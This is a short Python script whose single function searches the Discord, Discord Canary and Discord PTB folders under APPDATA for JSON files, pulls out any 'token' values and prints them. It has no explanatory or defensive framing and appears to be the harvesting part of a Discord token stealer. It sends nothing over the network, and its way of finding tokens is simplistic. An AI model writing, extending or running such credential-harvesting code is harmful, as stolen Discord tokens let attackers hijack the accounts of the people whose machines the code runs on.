import os
import glob
import json

def get_tokens():
    tokens = []
    appdata_path = os.path.join(os.environ["APPDATA"], "discord")
    discord_paths = [appdata_path, appdata_path + "canary", appdata_path + "ptb"]

    for path in discord_paths:
        if os.path.exists(path):
            token_files = glob.glob(os.path.join(path, "*.json"))
            for token_file in token_files:
                try:
                    with open(token_file, "r") as f:
                        data = json.load(f)
                        if "token" in data:
                            tokens.append(data["token"])
                except (json.JSONDecodeError, FileNotFoundError):
                    print(f"Error reading file: {token_file}")

    return tokens

print(get_tokens())